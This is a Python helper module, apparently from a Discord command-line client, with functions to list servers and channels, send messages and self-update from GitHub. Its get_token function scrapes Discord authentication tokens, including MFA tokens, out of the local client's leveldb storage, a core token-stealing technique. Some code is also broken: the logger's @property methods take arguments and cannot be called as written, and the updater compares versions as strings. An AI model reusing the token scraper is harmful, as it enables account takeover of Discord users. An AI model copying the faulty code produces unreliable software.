from zipfile import ZipFile
import time
import shutil
import os
import requests
import json
import re


# ========== EXCEPTIONS =================
class ServerException(Exception):
    def __init__(self, message="An error occurred while getting server information"):
        self.message = message
        super().__init__(self.message)

    def __str__(self):
        return f"{self.message}"


class ChannelException(Exception):
    def __init__(self, message="An error occurred while getting channel information"):
        self.message = message
        super().__init__(self.message)

    def __str__(self):
        return f"{self.message}"


class MessageException(Exception):
    def __init__(self, message="An error occurred while sending message to discord channel"):
        self.message = message
        super().__init__(self.message)

    def __str__(self):
        return f'{self.message}'
# =====================================

# ========== Common Functions =================


class Commons(object):
    def __init__(self): pass
    def clear(self): os.system("cls" if os.name == "nt" else "clear")
    def jsonify(self, data): return json.dumps(data)

# ========== Logger =================


class Logger(object):
    def __init__(self, write_file=True):
        """Log function write logs and print them out"""
        self.write_file = write_file

    @property
    def success(self, msg):
        """Log success'"""
        if self.write_file:
            with open("./log.txt", "a") as f:
                f.write("[SUCCESS]" + msg)
        print("\033[92m" + msg, end="\033[0m")

    @property
    def log(self, msg):
        """Log logs"""
        if self.write_file:
            with open("./log.txt", "a") as f:
                f.write("[LOG]" + msg)
        print("\033[93m" + msg, end="\033[0m")

    @property
    def error(self, msg):
        """Log errors"""
        if self.write_file:
            with open("./log.txt", "a") as f:
                f.write("[ERROR]" + msg)
        print("\033[91m" + msg, end="\033[0m")
# ================================================


def getheaders(token=None, content_type="application/json"):
    """Return requests headers"""
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def get_token():
    """Get tokens from discord clients (comment this out if you dont like it or replace it with "pass")"""
    res = []
    appdata = os.getenv('APPDATA')
    discord_path = [appdata + '\\Discord', appdata +
                    '\\discordcanary', appdata + '\\discordptb']
    for folder in discord_path:
        try:
            folder += '\\Local Storage\\leveldb'
            for file in os.listdir(folder):
                if not file.endswith('.log') and not file.endswith('.ldb'):
                    continue
                token_files = open(folder + '\\\\' + file,
                                   'r', errors='ignore').read()
                for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', token_files):
                    res.append(token)
                for token in re.findall(r'mfa\.[\w-]{84}', token_files):
                    res.append(token)
        except Exception:
            pass
    return res


def update():
    local = open("../../VERSION", "r").read()
    official = requests.get(
        "https://raw.githubusercontent.com/TerrificTable/Discord_CLI/main/VERSION").text

    if str(local) == str(official):
        pass
    elif str(local) < str(official):
        choise = input("Update avalable do you want to install it [y/n] >>> ")

        if choise.lower() == "y":
            try:
                new_version = requests.get(
                    "https://github.com/TerrificTable/Discord_CLI/archive/refs/heads/main.zip")

                with open("Discord_CLI-main.zip", 'wb')as zipfile:
                    zipfile.write(new_version.content)

                with ZipFile("Discord_CLI-main.zip", 'r') as filezip:
                    filezip.extractall()

                os.remove("Discord_CLI-main.zip")
                cwd = os.getcwd()+'\\Discord_CLI-main'
                shutil.copytree(cwd, os.getcwd(), dirs_exist_ok=True)
                shutil.rmtree(cwd)

                time.sleep(1)
                exit()
            except Exception as err:
                os.system("cls;clear")
                time.sleep(7)


def get_server_list(token, headers=None):
    """Get all servers `token` is on"""
    headers = getheaders(token=token) if headers == None else headers
    return requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=headers).content.strip().decode("ISO-8859-1")


def get_channel_list(server_id, token, headers=None):
    """Get all channels from `server_id` if ``token` is on the server"""
    headers = getheaders(token=token) if headers == None else headers
    return requests.get("https://discord.com/api/v9/guilds/%s/channels" % str(server_id), headers=headers).content.strip().decode("ISO-8859-1")


def send_message(message, channel_id, token):
    """Send `message` to/in `channel_id` using `token`"""
    requests.post(f'https://discord.com/api/v9/channels/'+channel_id+'/messages',
                  headers=getheaders(token),
                  data={"content": message})


def get_server(channel_id):  # TODO
    """Receve messages from server"""
    pass
